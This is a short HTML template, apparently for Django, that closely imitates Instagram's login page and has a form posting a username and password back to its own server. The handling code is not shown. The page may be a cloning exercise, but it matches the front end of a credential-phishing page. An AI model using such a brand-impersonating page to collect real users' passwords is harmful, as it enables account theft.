<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .login-container {
    background-color: #fff;
    padding: 20px;
    border: 1px solid #dbdbdb;
    text-align: center;
    width: 350px;
  }
  .login-container img {
    margin-top: 36px;
    margin-bottom: 12px;
  }
  .login-input {
    background-color: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    padding: 14px;
    margin-bottom: 6px;
    width: calc(100% - 28px);
  }
  .login-button {
    background-color: #0095f6;
    border: none;
    border-radius: 4px;
    color: white;
    padding: 8px 0;
    text-transform: uppercase;
    font-weight: bold;
    margin-top: 12px;
    width: 100%;
    cursor: pointer;
  }
  .login-button:disabled {
    background-color: #b2dffc;
  }
  .login-footer {
    margin-top: 20px;
  }
</style>
</head>
<body>
<div class="login-container">
  <!-- Instagram logo would go here -->
  <h1>Instagram</h1>
  <form method="post">
    {% csrf_token %}
  <input type="text" class="login-input" name="username" placeholder="Phone number, username, or email" required>
  <input type="password"  class="login-input" placeholder="Password"  name="password" required>
  <button type="submit" class="login-button">Log in</button>
  </form>
  <div class="login-footer">
    <!-- Links would go here -->
    <p>Don't have an account? <a href="#">Sign up</a></p>
  </div>
</div>
</body>
</html>
